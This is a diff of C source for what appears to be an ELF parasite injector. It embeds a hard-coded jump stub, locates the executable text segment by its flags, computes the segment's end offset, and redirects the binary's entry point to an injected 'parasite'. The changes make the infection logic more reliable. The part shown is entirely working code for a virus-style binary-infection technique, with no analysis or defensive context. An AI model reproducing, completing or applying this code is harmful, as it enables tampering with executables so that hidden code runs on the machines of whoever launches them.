@@ -18,6 +18,9 @@ int main(int argc, char **argv){
     char jmp_entry [] = "\x48\xb8\xd0\x05\x10\x00\x00\x00\x00\x00" //mov rax,0x4141414141414141
                         "\xff\xe0"; // jmp rax
 
+    // better is position independent 
+    // jmp rip-text_segment_len-10
+
     int jmp_len = 12;
 
 
@@ -57,9 +60,11 @@ int main(int argc, char **argv){
     // Locate the text segment program header:
     Elf64_Phdr *phdr = (Elf64_Phdr *)(mem + ehdr->e_phoff);
     for (i = 0; i < ehdr->e_phnum; i++){
-        if ((phdr[i].p_type == PT_LOAD) & (phdr[i].p_offset == 0)){
+        //if ((phdr[i].p_type == PT_LOAD) & (phdr[i].p_offset == 0)){
+         if ((phdr[i].p_type == PT_LOAD) & (phdr[i].p_flags == PF_X + PF_R)){  
             printf("Phdr (text segment) num: %d\n", i);
-            text_segment_end = phdr[i].p_filesz;
+            //text_segment_end = phdr[i].p_filesz;
+            text_segment_end = phdr[i].p_offset + phdr[i].p_filesz;
             printf("text segment end (offset): %ld\n", text_segment_end);
             
             // Modify the entry point to the parasite location.
